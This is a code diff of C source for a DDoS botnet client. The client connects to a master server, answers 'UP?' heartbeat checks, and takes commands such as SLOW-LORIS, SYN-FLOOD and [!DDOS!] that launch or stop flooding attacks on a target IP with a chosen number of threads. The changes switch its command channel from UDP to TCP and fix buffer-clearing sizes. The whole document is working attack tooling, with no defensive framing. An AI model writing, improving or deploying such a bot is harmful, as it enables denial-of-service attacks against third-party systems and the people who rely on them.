@@ -15,21 +15,20 @@
 
 int main_sock;
 struct sockaddr_in server;
-int server_size;
 
 // reads from the udp socket which is connected to the master. and closes if it recieves the signal.
 void wait_and_close(int f_write)
 {
-	server_size = sizeof(struct sockaddr_in);
-	char data[12];
-	printf("Waiting for Exit\n");
 	while(1){
-		recvfrom(main_sock, data, 10, 0, (struct sockaddr*)&server, &server_size);
+		char data[12];
+		
+		read(main_sock, data, 10);
+		
 		if(strstr(data, "UP?") != NULL){
 			// Run the code to tell that we are alive.
-			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
+			write(main_sock, "?YES!", 5);
 		}else if(strstr(data, "[!DDOS!]") != NULL){
-			//printf("[!DDOS!] Recieved\n");
+			printf("[*]Stopping Current DDOS\n");
 			write(f_write, "EXIT", 4);
 			close(f_write);
 			return;
@@ -95,7 +94,18 @@ void DDOS(int type, char *target_ip, short port, int n_thrds, char *target_url)
 void init(char *to_con, int port)
 {
 	main_sock = make_socket();
-	connect_to(main_sock, to_con, port, &server);
+
+	server.sin_addr.s_addr = inet_addr(to_con);
+    server.sin_family = AF_INET;
+    server.sin_port = htons(port);
+ 
+    //Connect to remote server
+    if (connect(main_sock , (struct sockaddr *)&server , sizeof(server)) == ERROR)
+    {
+        perror("connect error");
+        _exit(1);
+    }
+
 	printf("\033[0;35m[+] Connected to %s \033[0m\n", to_con);
 }
 
@@ -107,15 +117,14 @@ void connect_to_master()
 	char target_ip[31];
 	char thrds[5];
 	char s_port[7];
-	server_size = sizeof(struct sockaddr);
 	while(1){
-		memset(data_recved, 0, 80);
-		memset(target_ip, 0, 30);
-		memset(thrds, 0, 4);
-		memset(s_port, 0, 6);
+		memset(data_recved, 0, 81);
+		memset(target_ip, 0, 31);
+		memset(thrds, 0, 5);
+		memset(s_port, 0, 7);
 
-		bytes = recvfrom(main_sock, data_recved, 80, 0, (struct sockaddr *)&server, &server_size);		
-		
+		bytes = read(main_sock, data_recved, 80);		
+
 		if (bytes== ERROR){
 			perror("Unable to recv Data: ");
 			exit(1);
@@ -131,7 +140,7 @@ void connect_to_master()
 			printf("Shutdown signal from Master\n");
 			_exit(0);
 		}else if(strncmp(data_recved, "UP?", 3) == 0){
-			sendto(main_sock, "?YES!", 5, 0, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
+			write(main_sock, "?YES!", 5);
 		}else if(strncmp(data_recved, "SLOW-LORIS", 10) == 0){
 			type = SLOW_LORIS;
 
@@ -147,7 +156,7 @@ void connect_to_master()
 			// DEBUG
 			printf("Threads: %s\033[0m\n", thrds);
 
-			DDOS(type, target_ip, NULL, atoi(thrds), NULL);
+			DDOS(type, target_ip, 0, atoi(thrds), NULL);
 
 		}else if(strncmp(data_recved, "SYN-FLOOD", 9) == 0){
 			type = SYN_FLOOD;
